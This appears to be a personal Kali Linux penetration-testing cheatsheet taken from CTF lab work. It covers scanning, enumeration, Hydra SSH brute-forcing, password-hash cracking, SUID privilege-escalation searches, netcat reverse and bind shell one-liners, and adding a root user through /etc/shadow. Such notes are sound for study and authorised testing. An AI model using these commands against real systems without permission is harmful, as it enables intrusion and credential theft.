## CHEATSHEET FOR KALI LINUX

_SELFNOTE: Obsidian for note-taking - Download directory ./Obsidian..._

## NESSUS

A commercial vulnerability assessment tool developed by Tenable.
It scans networks, hosts, and applications for known vulnerabilities, misconfigurations,
weak passwords, missing patches, and compliance issues.

start nessus by following command: `/bin/systemctl start nessusd.service`
Then go to https://localhost:8834
Check if nessus is running: `sudo service nessusd status`

---

## NIKTO

_Nikto_ is a web server scanner that can be used to find common vulnerabilities,
misconfigurations, and outdated software versions.
While not solely focused on directory brute-forcing,
it does include directory scanning as part of its functionality.

```bash
nikto -h <ip-target>
```

---

## NMAP

This scan all ports with timing template "aggressive" and with enabled OS, script and version detection

```bash
nmap -T4 -p- -A <ip>
```

---

## Gobuster

Fast discovery tool, great for brute-forcing URI's (directories and files),
DNS subdomains and virtual host names

```bash
gobuster dir -u http://10.10.239.8:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

---

## Enum4linux

When you execute the `enum4linux -a 10.10.197.2` command,
the _enum4linux_ tool will initiate an enumeration against the specified Windows system.
It will interact with the target system using various protocols and
techniques, attempting to gather information about users, groups, shares, and other relevant details.
The -v option will provide verbose output so you can see the progress and results of the enumeration.

```bash
enum4linux -a 10.10.197.52
```

---

## Linpeas.sh

very good for enumerate _linux/MacOS/windows_

```bash
./linpeas.sh | tee linpeas.log
```

---

## Hydra

Bruteforcing tool

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.197.52
```

---

## GTFOBINS

_Gfobins_ is a curated collection of Unix-like system binaries,
that can be used by attackers for privilege escalation,
escaping restricted environments, or executing commands with elevated privileges.
These binaries have certain configurations or functionalities
that can be abused by attackers to gain unauthorized access or execute commands on a target system.

https://gtfobins.github.io/gtfobins/systemctl/#suid // SUID (set owner userId upon execution)

---

## Linux cli

`sudo -l` lists all programs runnable as sudo

`find / -type f -perm -4000 2>/dev/null` This command will search the entire filesystem `/`
for files with the _SUID_ bit set `-perm -4000` and display their paths.

- !! Gives the last command typed - lets say `rm -r <directory>` which needs sudo so
  instead of retyping this can be typed: `sudo !!`
- Arguments: `$_` previous command last argument
- \$? \$? is a special variable that holds the exit status or return code of the last executed command
- `touch{0,1,2,3,4}` this gonna create foo0, foo1, foo2, foo3, foo4
- {a..j} this gonna create a,b,c,d,e…. So a through j
- systemctl(systemcontrol) sudo systemctl enable/disable httpd.service
- that will either make the given service to start or not when booting.
- sudo systemctl start|stop|restart httpd.service
- journalctl - logs from systemd
- dmesg - used for displaying kernel ring buffer messages
- amass - amass enum -d Tesla.com
- netdiscover (netdiscover -r 192.168.1.0/24
- arp-scan (arp-scan -l)
- sudo apt (sudo apt auto remove
- nikto (scanning webservers for vulnerbilities) nikto -h http://192.168.1.182
- dirbuster / gobuster — directory busting
  Reverse shell target connects to attacker (attacker gets control of shell)
  Binding shell attacker connects target (target gets control of shell)
- nc -nvlp 4444 (netcat start listening on port 4444) (sets up nectat listener)
- nc 192.168.1.159 4444 -e /bin/bash (establishes to listening netcat port)
- ssh-keygen // this generates a ssh keypair public and private

## Netcat

**_NETCAT REVERSE SHELL_**
ATTACKBOX: listening --> nc -nvlp 4444
TARGET: Connecting --> nc <ip> 4444 -e /bin/sh
BIND SHELL
ATTACKBOX: Connecting --> nc <ip> 4444
TARGET: Listening --> nc -nvlp 4444 -e /bin/sh
--> consider adding rlwrap for the listening shell --> rlwrap nc -nvlp 4444

---

## Remina

Very fine tool for _RDP connection_

---

## Steghide

steghide --> embeding stuff into files like images etc.
steghide info aa.jpg
steghide extract aa.jpg

---

## Cyberchef

CYBERCHEF websitet briliant for hashing and dehashing...

---

## More linux cli

USING FIND (locate file with exe perm as root) `find / -user root -perm /4000 2>/dev/null`
see what to run as **_SUDO_** `sudo -l`
`find / -perm -u=s -type f 2>/dev/null`

---

## John the Ripper

JOHN THE RIPPER -->    john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hashB.txt
(hash decrypter)    give file containing original string to encrypt and check against file containing hash string

ssh2john: -->        Trying to perform a brute-force or dictionary attack on an encrypted private key file, you can use
John the Ripper in combination with another tool like ssh2john to convert the private key into a format that John the
Ripper can work with.
ssh2john kay_id_rsa > forjohn.txt

HASH-IDENTIFIER -->    cat hashB.txt | hash-identifier
Checks with hashing type used for current hashed string

BASE64, 32, 58... -->    cat encoded.txt| base64 -d
perfect encoder for base64 or the others -- encode and decode

---

## Exiftool

Allows you to read, write, and manipulate metadata _EXIF, IPTC, XMP, and other types_ in various
types of files, including image, audio, and video files.
_ExifTool_ is written in _Perl_ and is available for use on various operating systems,
including _Linux, Windows, macOS_, and more.

Used for **_seasurfer THM_**: downloaded an PDF where _exiftool_ `seaSurf.pdf` command
showed what _pdfgenerater_ was used for the _pdfcreater_ which was exploitable exiftool WindowsXP.jpg

---

## Nc reverse shell

upgrade nc reverse shell --> `python3 -c 'import pty; pty.spawn("/bin/bash")'`
to a more stable shell export TERM=xterm
CTRL+Z
stty raw -echo; fg

---

## HACK THE BOX:

Very nice intro about common knowledges for dealing with cyber security logging and stuff
--> https://academy.hackthebox.com/module/87/section/880

python3 webserver -->    python3 -m http.server 9000

generate linux psw ->    openssl passwd -1 -salt <salt> <passwowd>
this generates a hashed password to insert into /etc/shadow file for creating a user with root

smtp-user-enum ->    smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.100.3
this checks for valid emails for target ip

LINUX ENUM -->
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

